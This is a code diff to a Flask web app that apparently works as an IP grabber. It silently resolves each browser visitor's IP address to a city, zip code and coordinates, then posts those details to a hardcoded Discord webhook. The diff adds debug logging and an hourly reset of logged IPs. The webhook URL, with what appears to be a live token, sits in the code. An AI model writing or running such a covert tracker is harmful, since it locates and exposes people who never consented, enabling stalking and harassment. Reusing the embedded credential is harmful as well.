@@ -2,6 +2,7 @@ from flask import Flask, request, redirect
 import requests
 import json
 from datetime import datetime
+from threading import Timer
 
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
@@ -29,7 +30,7 @@ def get_visitor_info(ip, user_agent):
         "country": details.get("country_name", "Unknown"),
         "countryCode": details.get("country_code", "xx").lower(),
         "region": details.get("region", ""),
-        "city": details.get("city", ""),
+        "city": details.get("city", "Unknown City"),
         "zip": details.get("postal", ""),
         "lat": details.get("latitude", 0),
         "lon": details.get("longitude", 0),
@@ -38,6 +39,9 @@ def get_visitor_info(ip, user_agent):
     }
 
 def send_to_discord(info):
+    # Debugging the city
+    print(f"City Info: {info['city']}")  # Log city to check if it's present
+
     flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
     ip_city = f"{info['ip']} ({info['city'] or 'Unknown City'})"
 
@@ -62,13 +66,24 @@ def send_to_discord(info):
     }
 
     headers = {"Content-Type": "application/json"}
-    requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
+    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
+    print(f"Discord webhook response: {response.status_code}")
+
+# Function to periodically clear logged IPs every hour
+def clear_logged_ips():
+    logged_ips.clear()
+    print("Logged IPs cleared")
+    Timer(3600, clear_logged_ips).start()  # Re-run the function every 1 hour
+
+# Start clearing logged IPs periodically when the app starts
+clear_logged_ips()
 
 @app.route('/')
 def index():
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
+    # Check if the IP is not logged and the user agent contains 'Mozilla'
     if ip not in logged_ips and "Mozilla" in user_agent:
         logged_ips.add(ip)
         info = get_visitor_info(ip, user_agent)
